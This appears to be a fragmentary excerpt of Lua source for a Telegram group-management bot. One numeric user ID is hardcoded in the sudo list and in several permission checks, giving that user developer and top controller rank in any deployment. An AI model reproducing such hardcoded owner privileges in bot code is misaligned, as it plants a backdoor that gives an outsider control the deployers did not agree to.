...
ControllerAll = false
local ListSudos ={Sudo_Id,1566031059,1072528028,1566031059}  
...
if UserId == 1566031059 then
Status = 'مطور السورس'
elseif UserId == 1566031059 then  
...
Special = Redis:sismember(LaRiCa.."Special:Group"..ChatId,UserId)
StatusMember = LuaTele.getChatMember(ChatId,UserId).status.luatele
if UserId == 1566031059 then Status = true
elseif UserId == 1566031059 then  Status = true
...
if tonumber(msg.sender.user_id) == 1566031059 then
msg.Name_Controller = 'المبرمج ارسينك'
msg.The_Controller = 1
elseif tonumber(msg.sender.user_id) == 1566031059 then
...
if msg.sender.user_id == tonumber(1566031059) then
LuaTele.sendText(msg_chat_id,msg_id,"⋆ انت مطور السورس يقلبي🌚♥","md",true)
elseif msg.sender.user_id == tonumber(1566031059) then
LuaTele.sendText(msg_chat_id,msg_id,"⋆ انت مطور السورس يقلبي🌚♥","md",true)
...
if tonumber(IdUser) == 1566031059 then
data.The_Controller = 1
elseif tonumber(IdUser) == 1566031059 then
data.The_Controller = 1
